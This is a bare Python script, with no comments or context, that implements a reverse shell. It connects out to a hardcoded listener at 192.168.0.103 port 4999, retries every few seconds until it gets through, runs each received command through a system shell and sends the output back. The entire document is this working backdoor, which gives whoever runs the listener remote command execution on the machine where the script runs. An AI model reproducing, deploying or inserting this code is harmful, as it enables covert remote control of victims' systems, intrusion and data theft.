import socket
import time
import subprocess

LHOST = '192.168.0.103'
LPORT = 4999


def cc(LHOST, LPORT):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((LHOST, LPORT))
		return(s)

	except Exception as e:
		print('connection error\n Trying.. .')
		return None

def listen(s):
	while True:
		data = s.recv(1024)
		if data[:-1] == '/exit':
			s.close()
			exit(0)
		else:
			cmd(s, data)

def cmd(s, data):
	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	saida = proc.stdout.read() + proc.stderr.read()
	s.send(saida)

def main():
	while True:
		connected = cc(LHOST, LPORT)
		if connected:
			listen(connected)
		else:
			time.sleep(3)

main()
